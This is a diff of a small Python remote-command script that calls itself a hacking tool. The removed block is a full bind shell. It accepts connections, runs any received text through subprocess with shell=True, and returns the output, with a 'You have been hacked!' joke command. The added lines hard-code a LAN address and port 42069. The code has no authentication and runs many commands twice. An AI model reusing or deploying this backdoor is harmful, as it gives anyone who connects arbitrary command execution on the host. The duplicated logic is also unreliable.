@@ -1,77 +1,18 @@
-# Client side script run on Laptop
-'''
-import socket
-import subprocess
-import os
-
-HOST = ''    # Enter server IP address here
-PORT =       # Enter a port number of your choice
-
-s = socket.socket()
-s.bind((HOST, PORT))
-s.listen(1)
-conn, addr = s.accept()
-print(f'Connected by {addr}')
-
-while True:
-    command = conn.recv(1024).decode()
-    if command.lower() == 'exit':
-        break
-
-    # Split command and arguments
-    cmd_parts = command.split()
-    cmd = cmd_parts[0]
-    args = cmd_parts[1:]
-
-    if cmd == 'ha':
-        print("You have been hacked!")
-    else:
-        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        conn.sendall(output.stdout.read())
-        conn.sendall(output.stderr.read())
-
-    if cmd == 'cd':
-        try:
-            os.chdir(args[0])
-            conn.sendall(b'Successfully changed directory\n')
-        except Exception as e:
-            conn.sendall(str(e).encode())
-    else:
-        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        conn.sendall(output.stdout.read())
-        conn.sendall(output.stderr.read())
-
-conn.close()
-'''
+# Uses powershell so it needs to run on a wondows machine
 
 import socket
 import subprocess
 import os
 
 
-
-def find_free_port():
-    # Create a new socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # Bind the socket to a random IP address and port number
-    s.bind(('0.0.0.0', 0))
-    
-    # Retrieve the port number that was assigned by the system
-    port = s.getsockname()[1]
-    
-    # Close the socket
-    s.close()
-    
-    # Return the port number
-    return port
-
-HOST = '192.168.1.201'    # Enter server IP address here
-PORT = find_free_port()      # Enter a port number of your choice
+HOST = '192.168.1.201'    # Enter Laptop IP address here
+PORT = 42069      # Enter a port number of your choice
 
 s = socket.socket()
 s.bind((HOST, PORT))
 s.listen(1)
+print(f'Listening on {HOST}:{PORT}')
+
 conn, addr = s.accept()
 print(f'Connected by {addr}')
 
